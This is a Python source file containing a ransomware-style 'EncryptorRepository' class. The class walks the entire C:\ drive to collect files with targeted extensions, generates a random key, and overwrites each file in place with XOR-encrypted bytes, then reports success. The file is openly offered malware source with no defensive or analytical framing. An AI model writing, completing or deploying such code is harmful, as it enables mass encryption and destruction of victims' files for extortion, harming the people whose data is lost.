import os
import random

class EncryptorRepository():

    def getEncryptor(self):
        return self.Encryptor

    def setEncryptor(self, Encryptor):
        self.Encryptor = Encryptor

    def grab_files(self):
        # This might change if you want to grab files from diffrent Disk (D:/, ...) : drives = ['%s:' % d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists('%s:' % d)]
        # This program is run for Windows systems but can be run on any Unix Dist (even MacOs)
        matching_files = []
        for root, dirs, files in os.walk('C:\\'):
            for file in files:
                pwd = root + '\\' + file
                file_path, file_ext = os.path.splitext(pwd)
                if file_ext in self.getEncryptor().getEncryptedExtensions():
                    matching_files.append(pwd)

        return matching_files

    def generateEncryptionKey(self):
        key = ''
        byte_list = ''
        for byte in range(0x00, 0xFF): # all 8 bit combination
            byte_list += (chr(byte))
        for i in range(self.getEncryptor().getEncryptionLevel()):
            key += random.choice(byte_list)
        
        return key

    def EncryptFiles(self, files, key):
        index = 0
        max_index = self.getEncryptor().getEncryptionLevel() - 1
        for file in files:
            try:
                with open(file, 'rb') as reading_file: # Read file as binary
                    data = reading_file.read()
                with open(file, 'wb') as reading_file: # Read file as binary
                    for byte in data:
                        xor_byte = byte ^ ord(key[index]) # Encrypt any byte
                        reading_file.write(xor_byte.to_bytes(1, 'little')) # write file
                        if index >= max_index:
                            index = 0
                        else:
                            index += 1
            except:
                print('Couldn\'t encrypt file \'' + file + '\'.')
        
        print('Files were encrypted successfully.\n')